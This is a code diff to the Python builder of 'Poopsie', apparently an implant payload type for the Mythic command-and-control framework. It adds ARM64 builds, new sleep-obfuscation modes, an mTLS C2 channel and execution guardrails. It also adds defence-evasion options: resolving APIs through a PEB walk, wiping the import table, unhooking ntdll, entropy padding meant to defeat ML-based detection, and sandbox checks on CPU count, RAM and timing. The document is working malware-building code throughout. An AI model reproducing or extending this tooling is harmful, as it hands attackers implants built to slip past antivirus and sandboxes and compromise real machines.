@@ -115,7 +115,7 @@ class Poopsie(PayloadType):
             name="architecture",
             parameter_type=BuildParameterType.ChooseOne,
             description="Target architecture for the payload",
-            choices=["x64", "x86"],
+            choices=["x64", "x86", "arm64"],
             default_value="x64",
             required=True,
         ),
@@ -131,7 +131,7 @@ class Poopsie(PayloadType):
             parameter_type=BuildParameterType.ChooseOne,
             description="Sleep obfuscation technique (Windows x64 only)",
             default_value="none",
-            choices=["none", "ekko"],
+            choices=["none", "ekko", "foliage", "death_sleep"],
             group_name="Sleep Obfuscation Options",
             hide_conditions=[
                 HideCondition(name="architecture", operand=HideConditionOperand.NotEQ, value="x64")
@@ -234,9 +234,127 @@ class Poopsie(PayloadType):
             ],
             supported_os=["Windows"]
         ),
+        BuildParameter(
+            name="evasion",
+            parameter_type=BuildParameterType.ChooseMultiple,
+            description=(
+                "Evasion techniques to reduce binary signatures (Windows only). "
+                "dfr: Dynamic Function Resolution via PEB walk (sensitive APIs resolved at runtime, not in IAT). "
+                "iat_obf: Wipe import directory in memory. "
+                "unhook_ntdll: Remap clean ntdll from disk. "
+                "entropy: Append English-text overlay to lower binary entropy (defeats ML entropy analysis)."
+            ),
+            default_value=[],
+            choices=["dfr", "iat_obf", "unhook_ntdll", "entropy"],
+            required=False,
+            group_name="Evasion Options",
+            supported_os=["Windows"],
+        ),
+        BuildParameter(
+            name="padding_size",
+            parameter_type=BuildParameterType.String,
+            description=(
+                "Append padding to the output binary to increase file size (in KB). "
+                "0 = disabled, uses the entropy word list by default. "
+                "This is separate from the 'entropy' evasion option which always uses 64KB."
+            ),
+            default_value="0",
+            required=False,
+            group_name="Evasion Options",
+        ),
+        BuildParameter(
+            name="padding_type",
+            parameter_type=BuildParameterType.ChooseOne,
+            description="Type of padding to append when padding_size > 0.",
+            default_value="text",
+            choices=["text", "zeroes"],
+            required=False,
+            group_name="Evasion Options",
+        ),
+        BuildParameter(
+            name="sandbox_evasion",
+            parameter_type=BuildParameterType.String,
+            description=(
+                "Sandbox evasion delay in seconds (0 = disabled). "
+                "Burns time using CPU work and file enumeration instead of sleep calls. "
+                "Sandboxes typically have short execution windows (5-30s). "
+                "Recommended: 10-30 seconds."
+            ),
+            default_value="0",
+            required=False,
+            group_name="Evasion Options",
+            supported_os=["Windows"],
+        ),
+        BuildParameter(
+            name="guardrail_hostname",
+            parameter_type=BuildParameterType.String,
+            description="Only execute if the hostname matches (case-insensitive). Empty = disabled.",
+            default_value="",
+            required=False,
+            group_name="Execution Guardrails",
+        ),
+        BuildParameter(
+            name="guardrail_domain",
+            parameter_type=BuildParameterType.String,
+            description="Only execute if the machine is joined to this domain (case-insensitive). Empty = disabled.",
+            default_value="",
+            required=False,
+            group_name="Execution Guardrails",
+            supported_os=["Windows"],
+        ),
+        BuildParameter(
+            name="guardrail_username",
+            parameter_type=BuildParameterType.String,
+            description="Only execute if running as this user (case-insensitive). Empty = disabled.",
+            default_value="",
+            required=False,
+            group_name="Execution Guardrails",
+        ),
+        BuildParameter(
+            name="guardrail_ip",
+            parameter_type=BuildParameterType.String,
+            description="Only execute if the host has this IP address. Supports exact match or CIDR notation (e.g. 10.0.0.0/24). Empty = disabled.",
+            default_value="",
+            required=False,
+            group_name="Execution Guardrails",
+        ),
+        BuildParameter(
+            name="guardrail_process",
+            parameter_type=BuildParameterType.String,
+            description="Only execute if this process is currently running (e.g. outlook.exe). Empty = disabled.",
+            default_value="",
+            required=False,
+            group_name="Execution Guardrails",
+        ),
+        BuildParameter(
+            name="guardrail_min_cpus",
+            parameter_type=BuildParameterType.String,
+            description="Minimum number of logical CPU cores required (0 = disabled). Useful for sandbox evasion — most sandboxes have 1-2 cores.",
+            default_value="0",
+            required=False,
+            group_name="Execution Guardrails",
+        ),
+        BuildParameter(
+            name="guardrail_min_ram_mb",
+            parameter_type=BuildParameterType.String,
+            description="Minimum total RAM in MB required (0 = disabled). Useful for sandbox evasion — most sandboxes have <4096 MB.",
+            default_value="0",
+            required=False,
+            group_name="Execution Guardrails",
+        ),
     ]
     
-    c2_profiles = ["http", "websocket", "httpx", "dns", "tcp", "smb"]
+    guardrail_descriptions = {
+        "hostname": "Only execute if the hostname matches (case-insensitive). Empty = disabled.",
+        "domain": "Only execute if the machine is joined to this domain (case-insensitive). Empty = disabled.",
+        "username": "Only execute if running as this user (case-insensitive). Empty = disabled.",
+        "ip": "Only execute if the host has this IP address. Supports exact match or CIDR notation (e.g. 10.0.0.0/24). Empty = disabled.",
+        "process": "Only execute if this process is currently running (e.g. outlook.exe). Empty = disabled.",
+        "min_cpus": "Minimum number of logical CPU cores required (0 = disabled).",
+        "min_ram_mb": "Minimum total RAM in MB required (0 = disabled).",
+    }
+
+    c2_profiles = ["http", "websocket", "httpx", "dns", "tcp", "smb", "mtls"]
 
     c2_parameter_deviations = {
         "http": {
@@ -303,12 +421,30 @@ class Poopsie(PayloadType):
             
             architecture = self.get_parameter("architecture")
             sleep_obfuscation = self.get_parameter("sleep_obfuscation")
-            if architecture == "x86" and sleep_obfuscation == "ekko":
+            if architecture == "x86" and sleep_obfuscation != "none":
                 c2_params["sleep_obfuscation"] = "none"
             else:
                 c2_params["sleep_obfuscation"] = sleep_obfuscation
             
             c2_params["self_delete"] = str(self.get_parameter("self_delete"))
+            
+            # Add execution guardrails to build environment
+            guardrail_hostname = self.get_parameter("guardrail_hostname") or ""
+            guardrail_domain = self.get_parameter("guardrail_domain") or ""
+            guardrail_username = self.get_parameter("guardrail_username") or ""
+            guardrail_ip = self.get_parameter("guardrail_ip") or ""
+            guardrail_process = self.get_parameter("guardrail_process") or ""
+            
+            c2_params["GUARDRAIL_HOSTNAME"] = guardrail_hostname.strip()
+            c2_params["GUARDRAIL_DOMAIN"] = guardrail_domain.strip()
+            c2_params["GUARDRAIL_USERNAME"] = guardrail_username.strip()
+            c2_params["GUARDRAIL_IP"] = guardrail_ip.strip()
+            c2_params["GUARDRAIL_PROCESS"] = guardrail_process.strip()
+            
+            guardrail_min_cpus = self.get_parameter("guardrail_min_cpus") or "0"
+            guardrail_min_ram_mb = self.get_parameter("guardrail_min_ram_mb") or "0"
+            c2_params["GUARDRAIL_MIN_CPUS"] = guardrail_min_cpus.strip()
+            c2_params["GUARDRAIL_MIN_RAM_MB"] = guardrail_min_ram_mb.strip()
             
             if output_type == "Service":
                 service_name = self.get_parameter("service_name")
@@ -359,6 +495,58 @@ class Poopsie(PayloadType):
                 else:
                     build_env[key.upper()] = str(val)
 
+            # ── mTLS certificate handling ──────────────────────────────────────
+            #
+            # The mtls C2 profile requires three PEM values embedded into the agent
+            # at compile time (as base64-encoded env vars):
+            #
+            #   CLIENT_CERT_PEM  – Client certificate presented during TLS handshake
+            #   CLIENT_KEY_PEM   – Client private key (proves cert ownership)
+            #   CA_CERT_PEM      – CA certificate used to verify the server
+            #
+            # User has two options in the Mythic UI:
+            #
+            #   1. AUTO-GENERATE (default) – Leave all three fields empty.
+            #      The builder fetches the CA from the mtls container's cert API
+            #      (GET http://127.0.0.1:8444/ca), generates an ECDSA P-384 key +
+            #      CSR locally, sends the CSR to POST http://127.0.0.1:8444/sign,
+            #      and receives a signed client cert. Retries up to 5× / 2s delay
+            #      in case the cert API is restarting after a config check.
+            #
+            #   2. USER-PROVIDED – Paste raw PEM text into all three fields.
+            #      The builder uses them as-is (no API calls). Useful when you
+            #      have an external CA or want to pre-generate/track certs.
+            #
+            # In both cases the builder base64-encodes each PEM and sets:
+            #   MTLS_CLIENT_CERT, MTLS_CLIENT_KEY, MTLS_CA_CERT
+            # which the Nim agent reads as compile-time constants.
+            # ──────────────────────────────────────────────────────────────────────
+            if profile.lower() == "mtls":
+                import base64 as b64
+                client_cert = build_env.get("CLIENT_CERT_PEM", "").strip()
+                client_key = build_env.get("CLIENT_KEY_PEM", "").strip()
+                ca_cert = build_env.get("CA_CERT_PEM", "").strip()
+
+                if client_cert and client_key and ca_cert:
+                    resp.build_message += "  mTLS: Using user-provided certificates\n"
+                else:
+                    resp.build_message += "  mTLS: Auto-generating client certificate from server CA...\n"
+                    try:
+                        ca_cert, client_cert, client_key = await self._mtls_auto_generate_certs()
+                        resp.build_message += "  mTLS: Auto-generated client cert + key signed by server CA\n"
+                    except Exception as e:
+                        resp.build_message += f"  mTLS: Failed to auto-generate certs: {e}\n"
+                        resp.status = BuildStatus.Error
+                        return resp
+
+                for pem_data, env_key in [
+                    (client_cert, "MTLS_CLIENT_CERT"),
+                    (client_key, "MTLS_CLIENT_KEY"),
+                    (ca_cert, "MTLS_CA_CERT"),
+                ]:
+                    build_env[env_key] = b64.b64encode(pem_data.encode()).decode()
+                    resp.build_message += f"  {env_key}: embedded ({len(pem_data)} bytes PEM)\n"
+
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
                 StepName="Configuration",
@@ -403,7 +591,13 @@ class Poopsie(PayloadType):
 
             payload_compression = self.get_parameter("payload_compression")
             if not (output_type == "Shellcode" and selected_os == "Windows"):
-                strip_cmd = f"strip {output_path}"
+                if architecture == "arm64" and selected_os == "Windows":
+                    strip_bin = "/opt/llvm-mingw/bin/llvm-strip"
+                elif architecture == "arm64" and selected_os == "Linux":
+                    strip_bin = "aarch64-linux-gnu-strip"
+                else:
+                    strip_bin = "strip"
+                strip_cmd = f"{strip_bin} {output_path}"
                 proc = await asyncio.create_subprocess_shell(
                     strip_cmd,
                     stdout=asyncio.subprocess.PIPE,
@@ -414,6 +608,20 @@ class Poopsie(PayloadType):
                     resp.build_message += f"[strip] {strip_cmd} failed: {stderr.decode()}\n"
                     resp.status = BuildStatus.Error
                     return resp
+
+                # Post-compile evasion: entropy padding (Windows PE only)
+                evasion_options = self.get_parameter("evasion") or []
+                if selected_os == "Windows" and "entropy" in evasion_options:
+                    self.add_entropy_padding(str(output_path))
+                    resp.build_message += "Evasion: Entropy padding added (64KB text)\n"
+
+                # Configurable padding (any OS/arch)
+                padding_size = int(self.get_parameter("padding_size") or "0")
+                padding_type = self.get_parameter("padding_type") or "text"
+                if padding_size > 0:
+                    self.add_entropy_padding(str(output_path), target_kb=padding_size, pad_type=padding_type)
+                    resp.build_message += f"Custom padding added ({padding_size}KB {padding_type})\n"
+
                 if payload_compression == "upx":
                     upx_cmd = f"/upx --best --lzma {output_path}"
                     proc = await asyncio.create_subprocess_shell(
@@ -457,7 +665,11 @@ class Poopsie(PayloadType):
                     return resp
                 
                 dll_path = dll_build_result["path"]
-                strip_cmd = f"strip {dll_path}"
+                if architecture == "arm64" and selected_os == "Windows":
+                    strip_bin = "/opt/llvm-mingw/bin/llvm-strip"
+                else:
+                    strip_bin = "strip"
+                strip_cmd = f"{strip_bin} {dll_path}"
                 proc = await asyncio.create_subprocess_shell(
                     strip_cmd,
                     stdout=asyncio.subprocess.PIPE,
@@ -468,6 +680,18 @@ class Poopsie(PayloadType):
                     resp.build_message += f"[strip DLL] {strip_cmd} failed: {stderr.decode()}\n"
                     resp.status = BuildStatus.Error
                     return resp
+
+                # Post-compile evasion on DLL before shellcode conversion
+                if "entropy" in evasion_options:
+                    self.add_entropy_padding(str(dll_path))
+                    resp.build_message += "Evasion: Entropy padding added to DLL\n"
+
+                # Configurable padding on DLL before shellcode conversion
+                padding_size = int(self.get_parameter("padding_size") or "0")
+                padding_type = self.get_parameter("padding_type") or "text"
+                if padding_size > 0:
+                    self.add_entropy_padding(str(dll_path), target_kb=padding_size, pad_type=padding_type)
+                    resp.build_message += f"Custom padding added to DLL ({padding_size}KB {padding_type})\n"
 
                 tool = self.get_parameter("tool")
                 command = ""
@@ -547,6 +771,73 @@ class Poopsie(PayloadType):
 
         return resp
 
+    async def _mtls_auto_generate_certs(self) -> tuple:
+        """Auto-generate client cert signed by the mTLS server's CA.
+        
+        Calls the mtls container's internal cert API (port 8444):
+          GET  /ca   -> CA certificate PEM
+          POST /sign -> signs a CSR, returns client certificate PEM
+        
+        Retries up to 5 times with 2s delay (the cert API may be
+        restarting after config check triggers RestartInternalServer).
+        
+        Returns (ca_cert_pem, client_cert_pem, client_key_pem).
+        """
+        import subprocess
+        import tempfile
+        import urllib.request
+
+        mtls_cert_api = "http://127.0.0.1:8444"
+
+        # Retry loop — cert API may be restarting after config check
+        ca_cert = None
+        last_err = None
+        for attempt in range(5):
+            try:
+                with urllib.request.urlopen(f"{mtls_cert_api}/ca", timeout=10) as resp:
+                    ca_cert = resp.read().decode()
+                break
+            except Exception as e:
+                last_err = e
+                await asyncio.sleep(2)
+        if ca_cert is None:
+            raise RuntimeError(f"Cannot reach mtls cert API after 5 attempts: {last_err}")
+
+        with tempfile.TemporaryDirectory() as tmpdir:
+            client_key_path = os.path.join(tmpdir, "client_key.pem")
+            client_csr_path = os.path.join(tmpdir, "client.csr")
+
+            # Generate client ECDSA P-384 key
+            subprocess.run(
+                ["openssl", "ecparam", "-name", "secp384r1", "-genkey", "-noout", "-out", client_key_path],
+                capture_output=True, check=True, timeout=10
+            )
+            # Generate CSR
+            subprocess.run(
+                ["openssl", "req", "-new", "-key", client_key_path,
+                 "-subj", "/O=Mythic mTLS Agent/CN=agent",
+                 "-out", client_csr_path],
+                capture_output=True, check=True, timeout=10
+            )
+
+            with open(client_csr_path, "rb") as f:
+                csr_data = f.read()
+
+            # Send CSR to mtls server for signing
+            req = urllib.request.Request(
+                f"{mtls_cert_api}/sign",
+                data=csr_data,
+                headers={"Content-Type": "application/x-pem-file"},
+                method="POST"
+            )
+            with urllib.request.urlopen(req, timeout=10) as resp:
+                client_cert = resp.read().decode()
+
+            with open(client_key_path) as f:
+                client_key = f.read()
+
+        return ca_cert, client_cert, client_key
+
     async def run_nim_build(self, selected_os: str, output_type: str, build_env: dict) -> dict:
         """Compile Nim agent with environment variables"""
         try:
@@ -556,7 +847,12 @@ class Poopsie(PayloadType):
             env.update(build_env)
             
             architecture = self.get_parameter("architecture")
-            nim_cpu = "amd64" if architecture == "x64" else "i386"
+            if architecture == "x64":
+                nim_cpu = "amd64"
+            elif architecture == "arm64":
+                nim_cpu = "arm64"
+            else:
+                nim_cpu = "i386"
             
             encrypted_exchange = build_env.get("ENCRYPTED_EXCHANGE_CHECK", "").strip().upper()
             callback_host = build_env.get("CALLBACK_HOST", "").lower()
@@ -565,12 +861,16 @@ class Poopsie(PayloadType):
             needs_openssl_for_exchange = encrypted_exchange in ["T", "TRUE"]
             
             if selected_os == "Windows":
-                needs_openssl_for_transport = False
+                needs_openssl_for_transport = (
+                    profile == "mtls" or
+                    (profile == "websocket" and callback_host.startswith("wss://"))
+                )
             else:
                 needs_openssl_for_transport = (
                     callback_host.startswith("https://") or 
                     callback_host.startswith("wss://") or
-                    (profile == "websocket" and callback_host.startswith("wss://"))
+                    (profile == "websocket" and callback_host.startswith("wss://")) or
+                    profile == "mtls"
                 )
             
             use_openssl = needs_openssl_for_exchange or needs_openssl_for_transport
@@ -602,10 +902,24 @@ class Poopsie(PayloadType):
                 if architecture == "x64":
                     if self.get_parameter("sleep_obfuscation") == "ekko":
                         nim_args.append("-d:sleepObfuscationEkko")
+                    elif self.get_parameter("sleep_obfuscation") == "foliage":
+                        nim_args.append("-d:sleepObfuscationFoliage")
+                    elif self.get_parameter("sleep_obfuscation") == "death_sleep":
+                        nim_args.append("-d:sleepObfuscationDeathSleep")
 
             if use_openssl:
                 if selected_os == "Windows":
-                    build_messages.append("Static OpenSSL enabled (RSA key exchange + HTTPS/WSS transport, no DLL dependencies)")
+                    if needs_openssl_for_transport:
+                        # mTLS and ws library (wss://) use Nim's SSL module, which requires -d:ssl
+                        # and OpenSSL DLLs on the target (libssl-3-x64.dll, libcrypto-3-x64.dll)
+                        nim_args.append("-d:ssl")
+                        if profile == "mtls":
+                            build_messages.append("OpenSSL enabled for mTLS transport (-d:ssl, requires OpenSSL DLLs on target)")
+                        else:
+                            build_messages.append("OpenSSL enabled for WSS transport (-d:ssl, requires OpenSSL DLLs on target)")
+                    if needs_openssl_for_exchange:
+                        # RSA key exchange on Windows uses BCrypt (native), no OpenSSL needed
+                        build_messages.append("RSA key exchange enabled (native Windows BCrypt API)")
                 elif selected_os == "Linux":
                     nim_args.extend([
                         "-d:ssl",
@@ -624,8 +938,8 @@ class Poopsie(PayloadType):
                     build_messages.append("AESPSK mode (no RSA, standard httpclient)")
             
             if selected_os == "Windows":
-                if callback_host.startswith("https://") or callback_host.startswith("wss://"):
-                    build_messages.append("Custom WinHTTP client (native Windows API for HTTPS/WSS transport, no DLLs)")
+                if callback_host.startswith("https://"):
+                    build_messages.append("Custom WinHTTP client (native Windows API for HTTPS transport, no DLLs)")
             
             if output_type == "DLL":
                 nim_args.extend([
@@ -640,12 +954,67 @@ class Poopsie(PayloadType):
             
             # Add command compilation flags from Mythic's built-in command selection
             selected_commands = self.commands.get_commands()
-            for cmd in selected_commands:
+
+            # Commands unsupported on ARM64 Windows (x86/x64 inline asm, COFF relocations, CLR hosting, CONTEXT structs)
+            arm64_win_unsupported = {
+                "inline_execute",       # COFF/BOF loader only handles x86/x64 relocations
+                "execute_assembly",     # .NET CLR hosting is x86/x64 only
+                "inject_hollow",        # x86/x64 CONTEXT struct manipulation
+                "spawn",                # x86/x64 CONTEXT struct manipulation
+                "run_pe",               # Extensive x86/x64 PE loader code
+                "shinject",             # x86/x64 shellcode injection
+            }
+            # Commands unsupported on ARM64 regardless of OS
+            arm64_unsupported = {
+                "inline_execute",       # COFF/BOF loader only handles x86/x64 relocations
+            }
+
+            skipped_cmds = []
+            for cmd in sorted(selected_commands):
+                skip = False
+                if architecture == "arm64":
+                    if cmd in arm64_unsupported:
+                        skip = True
+                    elif cmd in arm64_win_unsupported and selected_os == "Windows":
+                        skip = True
+                if skip:
+                    skipped_cmds.append(cmd)
+                    continue
                 nim_args.append(f"-d:cmd_{cmd}")
+
+            if skipped_cmds:
+                build_messages.append(f"Commands skipped (unsupported on {architecture} {selected_os}): {', '.join(skipped_cmds)}")
+            
+            # Add profile compilation flag
+            nim_args.append(f"-d:profile_{profile}")
             
             build_messages.append(f"Commands: {len(selected_commands)} compiled")
             if selected_commands:
                 build_messages.append(f"Selected commands: {', '.join(sorted(selected_commands))}")
+            
+            # Evasion compile-time defines
+            evasion_options = self.get_parameter("evasion") or []
+            if selected_os == "Windows" and evasion_options:
+                # Evasion features use x86/x64 inline asm — skip on ARM64
+                if architecture == "arm64":
+                    skipped_evasions = [e for e in evasion_options if e in {"dfr", "iat_obf", "unhook_ntdll", "indirect_syscalls"}]
+                    evasion_options = [e for e in evasion_options if e not in {"dfr", "iat_obf", "unhook_ntdll", "indirect_syscalls"}]
+                    if skipped_evasions:
+                        build_messages.append(f"Evasion skipped (unsupported on ARM64): {', '.join(skipped_evasions)}")
+                if evasion_options:
+                    for evasion in evasion_options:
+                        nim_args.append(f"-d:evasion_{evasion}")
+                    build_messages.append(f"Evasion features: {', '.join(evasion_options)}")
+
+            sandbox_delay = self.get_parameter("sandbox_evasion") or "0"
+            try:
+                sandbox_seconds = int(sandbox_delay)
+            except ValueError:
+                sandbox_seconds = 0
+            if selected_os == "Windows" and sandbox_seconds > 0:
+                nim_args.append("-d:sandbox_evasion")
+                nim_args.append(f"-d:sandbox_delay_seconds={sandbox_seconds}")
+                build_messages.append(f"Sandbox evasion: {sandbox_seconds}s delay")
             
             if selected_os == "Windows":
                 if architecture == "x64":
@@ -656,6 +1025,16 @@ class Poopsie(PayloadType):
                         "--gcc.exe:x86_64-w64-mingw32-gcc",
                         "--gcc.linkerexe:x86_64-w64-mingw32-gcc",
                         "--passL:-static"
+                    ])
+                elif architecture == "arm64":
+                    nim_args.extend([
+                        "--os:windows",
+                        "--cpu:arm64",
+                        "--cc:gcc",
+                        "--gcc.exe:aarch64-w64-mingw32-gcc",
+                        "--gcc.linkerexe:aarch64-w64-mingw32-gcc",
+                        "--passL:-static",
+                        "-d:noRes",
                     ])
                 else:
                     nim_args.extend([
@@ -679,6 +1058,15 @@ class Poopsie(PayloadType):
                         "--passL:-m32",
                     ])
                     build_messages.append("Building for Linux x86 (32-bit) with -m32 flag")
+                elif architecture == "arm64":
+                    nim_args.extend([
+                        "--os:linux",
+                        "--cpu:arm64",
+                        "--cc:gcc",
+                        "--gcc.exe:aarch64-linux-gnu-gcc",
+                        "--gcc.linkerexe:aarch64-linux-gnu-gcc",
+                    ])
+                    build_messages.append("Building for Linux ARM64 with aarch64-linux-gnu-gcc")
                 else:
                     nim_args.extend([
                         "--os:linux",
@@ -779,6 +1167,52 @@ class Poopsie(PayloadType):
             return key_str.encode()
         else:
             return key_str.encode()
+
+    @staticmethod
+    def add_entropy_padding(pe_path: str, target_kb: int = 64, pad_type: str = "text"):
+        """Append padding as a PE overlay to the binary.
+        pad_type='text': low-entropy English-like text (reduces Shannon entropy).
+        pad_type='zeroes': null bytes (simpler, larger size increase)."""
+        pad_size = target_kb * 1024
+        if pad_type == "zeroes":
+            pad_bytes = b"\x00" * pad_size
+        else:
+            words = [
+                "the", "be", "to", "of", "and", "a", "in", "that", "have", "I",
+                "it", "for", "not", "on", "with", "he", "as", "you", "do", "at",
+                "this", "but", "his", "by", "from", "they", "we", "say", "her",
+                "she", "or", "an", "will", "my", "one", "all", "would", "there",
+                "their", "what", "so", "up", "out", "if", "about", "who", "get",
+                "which", "go", "me", "when", "make", "can", "like", "time", "no",
+                "just", "him", "know", "take", "people", "into", "year", "your",
+                "good", "some", "could", "them", "see", "other", "than", "then",
+                "now", "look", "only", "come", "its", "over", "think", "also",
+                "back", "after", "use", "two", "how", "our", "work", "first",
+                "well", "way", "even", "new", "want", "because", "any", "these",
+                "give", "day", "most", "us", "great", "between", "need", "large",
+                "under", "never", "each", "much", "begin", "those", "around",
+                "every", "still", "should", "help", "call", "world", "long",
+                "system", "program", "service", "start", "process", "application",
+                "function", "return", "value", "data", "information", "support",
+                "version", "number", "name", "file", "display", "output", "input",
+                "control", "change", "request", "response", "error", "message",
+            ]
+            import random
+            rng = random.Random(42)
+            padding = []
+            current_size = 0
+            while current_size < pad_size:
+                sentence_len = rng.randint(8, 20)
+                sentence = " ".join(rng.choice(words) for _ in range(sentence_len))
+                sentence = sentence.capitalize() + ".\r\n"
+                padding.append(sentence)
+                current_size += len(sentence)
+            pad_bytes = "".join(padding).encode("ascii")[:pad_size]
+        try:
+            with open(pe_path, "ab") as f:
+                f.write(pad_bytes)
+        except Exception:
+            pass
 
     def normalize_c2_config(self, config):
         """Normalize TOML-parsed config to match JSON structure expectations.
